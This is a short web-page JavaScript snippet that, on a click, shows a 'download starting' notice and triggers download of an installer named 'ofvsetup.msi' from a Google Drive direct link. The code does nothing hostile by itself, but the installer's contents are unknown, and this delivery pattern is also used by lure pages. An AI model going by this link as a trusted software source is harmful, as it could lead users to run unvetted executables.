  function showNotification(t) {
      var i = document.getElementById("notification");
      i.textContent = t, i.style.display = "block"
  }

  function hideNotification() {
      document.getElementById("notification").style.display = "none"
  }
  document.getElementById("download-link").addEventListener("click", function() {
      showNotification("Your download is starting. Please wait.");
      var t = document.createElement("a");
      t.href = "https://drive.usercontent.google.com/download?id=1s8WGXZrCY3MFhaI7oJ34gsBXaSTm-50T&export=download&authuser=0", t.download = "ofvsetup.msi", t.click(), setTimeout(function() {
          hideNotification()
      }, 3e3)
  });